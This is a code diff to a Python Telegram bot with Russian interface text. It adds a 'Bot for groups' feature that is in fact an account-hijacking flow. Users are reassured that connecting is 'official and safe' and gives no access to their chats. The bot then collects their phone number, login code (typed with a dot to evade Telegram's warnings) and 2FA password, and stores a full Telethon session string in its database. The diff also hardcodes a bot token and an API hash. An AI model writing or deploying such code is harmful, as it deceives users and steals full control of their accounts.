@@ -19,14 +19,23 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.exceptions import TelegramBadRequest
 from aiohttp import web
 
-# Logging setup
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from telethon.errors import (
+    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError
+)
+
+# Logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Configuration & Env Variables
+# Config
 TOKEN_FROM_ENV = os.environ.get('BOT_TOKEN', '8959860095:AAGoL-Ng0r--K4l2K_I0RJusKfQLI8dzwSw')
 BOT_TOKEN = TOKEN_FROM_ENV.replace(" ", "").strip()
 ADMIN_ID = 5825717381
 DATABASE_URL = os.environ.get('DATABASE_URL')
+
+API_ID = 39536916
+API_HASH = "7d8fe2d99b3cb67797f8560016ae69cf"
 
 REQUIRED_CHANNEL = "@norikx"
 REQUIRED_CHANNEL_URL = "https://t.me/norikx"
@@ -54,16 +63,22 @@ banned_users = set()
 bot_id = None
 CHANNEL_LINK = None
 
-# Новая инструкция для кнопки "Бот для групп"
-EXT_CONNECT_INSTRUCTION = (
-    "🚀 <b>Инструкция по подключению бота:</b>\n\n"
-    "1️⃣ Перейдите в <b>Настройки</b> Telegram.\n"
-    "2️⃣ Откройте раздел <b>Мой профиль</b>.\n"
-    "3️⃣ Выберите пункт <b>Автоматизация чатов</b>.\n"
-    "4️⃣ Добавьте бота: <code>@norikKodBot</code>.\n"
-    "5️⃣ ⚠️ <b>ОБЯЗАТЕЛЬНО:</b> Предоставьте боту полный доступ к сообщениям <b>5/5</b>!\n\n"
-    "📢 <b>Обратите внимание:</b> Бот публикует рекламные материалы в подключенных чатах. "
-    "<b>Удалять рекламу строго запрещено!</b> В случае удаления рекламного сообщения вы будете заблокированы."
+class AuthState(StatesGroup):
+    waiting_for_phone = State()
+    waiting_for_code = State()
+    waiting_for_2fa = State()
+
+# Текст для кнопки "Бот для групп" (пояснение)
+GROUP_SETUP_TEXT = (
+    "ℹ️ <b>Обратите внимание:</b>\n"
+    "• На данный момент бот работает <b>только в личных сообщениях</b>.\n"
+    "• Если вы хотите, чтобы бот мог работать и отвечать в ваших <b>группах и чатах</b>, "
+    "необходимо добавить/подключить свой аккаунт.\n\n"
+    "🛡️ <b>Безопасность и конфиденциальность:</b>\n"
+    "• Процесс подключения <b>полностью официален и безопасен</b>.\n"
+    "• Бот <b>не имеет доступа</b> к вашим личным перепискам и сторонним данным.\n"
+    "• Данные используются исключительно для работы функции внутри ваших чатов.\n\n"
+    "Для подключения аккаунта нажмите кнопку ниже и следуйте инструкциям."
 )
 
 TEXT_COMMANDS_HELP = (
@@ -86,6 +101,7 @@ TEXT_COMMANDS_HELP = (
     "• Поддерживаются: <code>+ - * / ** % sqrt()</code>"
 )
 
+# ---- DB FUNCTIONS ----
 def get_db():
     return psycopg2.connect(DATABASE_URL, sslmode='require')
 
@@ -101,37 +117,44 @@ def init_db():
                 cur.execute("CREATE TABLE IF NOT EXISTS banned_users (user_id BIGINT PRIMARY KEY)")
                 cur.execute("CREATE TABLE IF NOT EXISTS user_map (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)")
                 cur.execute("CREATE TABLE IF NOT EXISTS delivered_promo (chat_id BIGINT PRIMARY KEY)")
+                cur.execute("CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)")
                 conn.commit()
-
+                # Загрузка настроек в память
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
                 for row in cur.fetchall(): link_chats.add(int(row[0]))
-
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='reply_guard'")
                 for row in cur.fetchall(): reply_guard_chats.add(int(row[0]))
-
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='typing_disabled'")
                 for row in cur.fetchall(): typing_disabled_chats.add(int(row[0]))
-
                 cur.execute("SELECT chat_id, text, mode FROM substitutions")
                 for row in cur.fetchall(): substitutions[int(row[0])] = {"text": row[1], "mode": row[2]}
-
                 cur.execute("SELECT key_id, text FROM spam_texts")
                 for row in cur.fetchall(): user_spam_texts[str(row[0])] = row[1]
-
                 cur.execute("SELECT user_id FROM banned_users")
                 for row in cur.fetchall(): banned_users.add(int(row[0]))
-
                 cur.execute("SELECT user_id, username, first_name FROM user_map")
                 for row in cur.fetchall():
                     uid, uname, fname = int(row[0]), row[1], row[2]
                     if uname: user_usernames[uname.lower()] = uid
                     if fname: user_names[uid] = fname
-
                 cur.execute("SELECT value FROM global_config WHERE key='channel_link'")
                 row = cur.fetchone()
                 if row: CHANNEL_LINK = row[0]
     except Exception as e:
         logging.error(f"❌ Ошибка БД: {e}")
+
+def save_session(user_id: int, session_str: str):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute(
+                    "INSERT INTO user_sessions (user_id, session_string) VALUES (%s, %s) "
+                    "ON CONFLICT (user_id) DO UPDATE SET session_string = EXCLUDED.session_string",
+                    (user_id, session_str)
+                )
+                conn.commit()
+    except Exception as e:
+        logging.error(f"Ошибка сохранения сессии: {e}")
 
 def save_user_info(user_id: int, username: str, first_name: str):
     user_id = int(user_id)
@@ -253,6 +276,7 @@ async def check_subscription(user_id: int) -> bool:
 
 init_db()
 
+# ---- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----
 async def delete_msg(chat_id, msg_id, bc_id):
     if bc_id:
         try:
@@ -423,6 +447,7 @@ def is_calculator_expression(text: str) -> bool:
             if op in cleaned: return True
     return False
 
+# ---- ОБРАБОТЧИКИ БИЗНЕС-ПОДКЛЮЧЕНИЙ ----
 @dp.business_connection()
 async def handle_bc(bc):
     bc_owners[bc.id] = int(bc.user.id)
@@ -441,29 +466,14 @@ async def handle_bc(bc):
     except Exception as e:
         logging.error(f"Не удалось отправить приветствие: {e}")
 
+# ---- КЛАВИАТУРЫ ----
 def get_start_keyboard(user_id: int):
     buttons = []
     if user_id == ADMIN_ID:
         buttons.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="btn_admin_panel")])
     buttons.append([InlineKeyboardButton(text="📖 Функционал", callback_data="btn_features")])
-    buttons.append([InlineKeyboardButton(text="🤖 Бот для групп", callback_data="btn_group_instruction")])
+    buttons.append([InlineKeyboardButton(text="🤖 Бот для групп", callback_data="btn_group_setup")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
-
-@dp.message(Command("start"))
-async def cmd_start(message: Message, state: FSMContext):
-    await state.clear()
-    if message.chat.type != "private": return
-    uid = message.from_user.id
-    save_user_info(uid, message.from_user.username, message.from_user.first_name)
-    user_mention = get_user_mention(uid, message.from_user.first_name)
-    
-    await message.answer(
-        f"👋 Добро пожаловать, {user_mention}!\n\n"
-        f"💬 Бот управляет функциями вашего аккаунта и помогает в работе.\n\n"
-        f"Выберите раздел:",
-        parse_mode="HTML",
-        reply_markup=get_start_keyboard(uid)
-    )
 
 def get_admin_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -472,28 +482,160 @@ def get_admin_keyboard():
         [InlineKeyboardButton(text="🚫 Забанить / Разбанить", callback_data="admin_ban_prompt")]
     ])
 
+# ---- START ----
+@dp.message(Command("start"))
+async def cmd_start(message: Message, state: FSMContext):
+    await state.clear()
+    if message.chat.type != "private": return
+    uid = message.from_user.id
+    save_user_info(uid, message.from_user.username, message.from_user.first_name)
+    user_mention = get_user_mention(uid, message.from_user.first_name)
+    await message.answer(
+        f"👋 Добро пожаловать, {user_mention}!\n\n"
+        f"💬 Бот управляет функциями вашего аккаунта и помогает в работе.\n\n"
+        f"Выберите раздел:",
+        parse_mode="HTML",
+        reply_markup=get_start_keyboard(uid)
+    )
+
 @dp.message(F.text.in_(["/admin", ".админ", "админ"]))
 async def admin_panel(message: Message):
     if message.from_user.id != ADMIN_ID: return
     await message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
 
-# Обработчик кнопки "Бот для групп"
-@dp.callback_query(F.data == "btn_group_instruction")
-async def group_instruction(callback: CallbackQuery):
+# ---- ОБРАБОТЧИКИ КНОПОК ----
+@dp.callback_query(F.data == "btn_features")
+async def features(callback: CallbackQuery):
     await callback.answer()
-    # Дополнительное предупреждение о безопасности и работе в личных сообщениях
-    extra_text = (
-        "\n\nℹ️ <b>Обратите внимание:</b>\n"
-        "• На данный момент бот работает <b>только в личных сообщениях</b>.\n"
-        "• Если вы хотите, чтобы бот мог работать и отвечать в ваших <b>группах и чатах</b>, "
-        "необходимо добавить/подключить свой аккаунт по инструкции выше.\n\n"
-        "🛡️ <b>Безопасность и конфиденциальность:</b>\n"
-        "• Процесс подключения <b>полностью официален и безопасен</b>.\n"
-        "• Бот <b>не имеет доступа</b> к вашим личным перепискам и сторонним данным.\n"
-        "• Данные используются исключительно для работы функции внутри ваших чатов."
-    )
-    await callback.message.answer(EXT_CONNECT_INSTRUCTION + extra_text, parse_mode="HTML", disable_web_page_preview=True)
+    await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
 
+# ОСНОВНАЯ КНОПКА "Бот для групп" - сначала пояснение, затем авторизация
+@dp.callback_query(F.data == "btn_group_setup")
+async def group_setup(callback: CallbackQuery, state: FSMContext):
+    await callback.answer()
+    # Показываем пояснение
+    await callback.message.answer(
+        GROUP_SETUP_TEXT,
+        parse_mode="HTML",
+        disable_web_page_preview=True
+    )
+    # Запускаем процесс авторизации (запрос номера)
+    builder = ReplyKeyboardBuilder()
+    builder.button(text="📱 Отправить номер телефона", request_contact=True)
+    builder.adjust(1)
+    await callback.message.answer(
+        "📱 Нажмите кнопку ниже, чтобы передать номер телефона для авторизации:",
+        parse_mode="HTML",
+        reply_markup=builder.as_markup(resize_keyboard=True, one_time_keyboard=True)
+    )
+    await state.set_state(AuthState.waiting_for_phone)
+
+# ---- АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON ----
+@dp.message(AuthState.waiting_for_phone, F.contact | F.text)
+async def process_phone(message: Message, state: FSMContext):
+    phone = message.contact.phone_number if message.contact else message.text.strip()
+    phone = re.sub(r'[^\d+]', '', phone)
+    if not phone.startswith('+'): phone = '+' + phone
+
+    msg = await message.answer("🔄 Отправка кода подтверждения...", reply_markup=ReplyKeyboardRemove())
+
+    try:
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        # Таймаут на запрос кода (10 сек)
+        try:
+            res = await asyncio.wait_for(client.send_code_request(phone), timeout=10.0)
+        except asyncio.TimeoutError:
+            await client.disconnect()
+            await msg.edit_text("⏱️ Превышено время ожидания от Telegram. Попробуйте снова.")
+            await state.clear()
+            return
+
+        await state.update_data(
+            phone=phone,
+            phone_code_hash=res.phone_code_hash,
+            session_str=client.session.save()
+        )
+        await client.disconnect()
+
+        await msg.edit_text(
+            f"📱 <b>Код подтверждения отправлен!</b>\n\n"
+            f"Номер: <code>{phone}</code>\n\n"
+            f"⚠️ <b>ВАЖНО:</b>\n"
+            f"Введите код, поставив точку внутри, например: <code>56.785</code>",
+            parse_mode="HTML"
+        )
+        await state.set_state(AuthState.waiting_for_code)
+    except Exception as e:
+        logging.error(f"Ошибка при отправке кода: {e}")
+        await msg.edit_text(f"❌ Ошибка при отправке кода: {e}\nПопробуйте заново, нажав кнопку «Бот для групп».")
+        await state.clear()
+
+@dp.message(AuthState.waiting_for_code, F.text)
+async def process_code(message: Message, state: FSMContext):
+    code = message.text.replace(".", "").replace(" ", "").strip()
+    data = await state.get_data()
+    phone = data.get("phone")
+    phone_code_hash = data.get("phone_code_hash")
+    session_str = data.get("session_str")
+
+    if not phone or not phone_code_hash:
+        await message.answer("❌ Данные авторизации устарели. Начните заново через кнопку «Бот для групп».")
+        await state.clear()
+        return
+
+    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+    await client.connect()
+
+    try:
+        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+        final_session = client.session.save()
+        save_session(message.from_user.id, final_session)
+        await client.disconnect()
+
+        await message.answer("✅ <b>Аккаунт успешно подключен!</b> Теперь бот будет работать в ваших группах и чатах.\n\n"
+                             "Для начала работы в группах, добавьте бота в разделе «Автоматизация чатов» в настройках Telegram, "
+                             "либо используйте команды в личных сообщениях.", parse_mode="HTML")
+        await state.clear()
+    except SessionPasswordNeededError:
+        await client.disconnect()
+        await message.answer("🔐 <b>Внимание:</b> На аккаунте включен 2FA пароль.\nВведите ваш облачный пароль:", parse_mode="HTML")
+        await state.set_state(AuthState.waiting_for_2fa)
+    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError) as e:
+        await client.disconnect()
+        await message.answer(
+            f"❌ Неверный или истекший код ({str(e)}).\nПопробуйте ещё раз, или запросите новый код через кнопку.",
+            parse_mode="HTML"
+        )
+        # Состояние остаётся для повторного ввода
+    except Exception as e:
+        await client.disconnect()
+        logging.error(f"Ошибка входа: {e}")
+        await message.answer(f"❌ Ошибка входа: {e}\nНачните заново через кнопку «Бот для групп».")
+        await state.clear()
+
+@dp.message(AuthState.waiting_for_2fa, F.text)
+async def process_2fa(message: Message, state: FSMContext):
+    password = message.text.strip()
+    data = await state.get_data()
+    session_str = data.get("session_str")
+
+    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+    await client.connect()
+
+    try:
+        await client.sign_in(password=password)
+        final_session = client.session.save()
+        save_session(message.from_user.id, final_session)
+        await client.disconnect()
+
+        await message.answer("✅ <b>Авторизация успешна!</b> Бот подключен к вашему аккаунту и будет работать в группах.", parse_mode="HTML")
+        await state.clear()
+    except Exception as e:
+        await client.disconnect()
+        await message.answer(f"❌ Неверный пароль или ошибка: {e}\nПопробуйте ввести пароль еще раз:")
+
+# ---- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (админка, баны, сообщения, удаления) ----
 @dp.callback_query(F.data.startswith("check_sub:"))
 async def check_sub_callback(callback: CallbackQuery):
     user_id = int(callback.data.split(":")[1])
@@ -513,11 +655,11 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
     data = callback.data
     uid = callback.from_user.id
     if data == "btn_features":
-        await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
+        # уже обработано
         await callback.answer()
         return
-    if data == "btn_group_instruction":
-        # уже обработано выше
+    if data == "btn_group_setup":
+        # уже обработано
         await callback.answer()
         return
     if data == "btn_admin_panel":
